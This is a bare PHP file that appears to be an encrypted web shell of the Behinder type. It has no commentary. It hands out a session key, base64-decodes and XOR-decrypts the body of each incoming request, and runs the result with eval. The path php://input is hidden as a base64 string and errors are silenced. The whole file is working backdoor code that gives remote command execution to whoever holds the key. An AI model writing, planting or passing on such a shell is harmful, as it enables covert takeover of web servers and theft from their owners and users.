<?php
session_start();
function mr6(){
    return 1<0?NULL:base64_decode("cGhwOi8vaW5wdXQ=");
}
if (isset($_GET['pass'])) {
    $key = substr(md5(uniqid(rand())), 16);
    $_SESSION['k'] = $key;
    print $key;
} else {
    @$key = $_SESSION['k'];
    $post = base64_decode(file_get_contents(mr6()));
    for ($i = 0; $i < strlen($post); $i++) {
        $post[$i] = $post[$i] ^ $key[$i + 1 & 15];
    }
    @eval(explode('|', $post)[1]);
}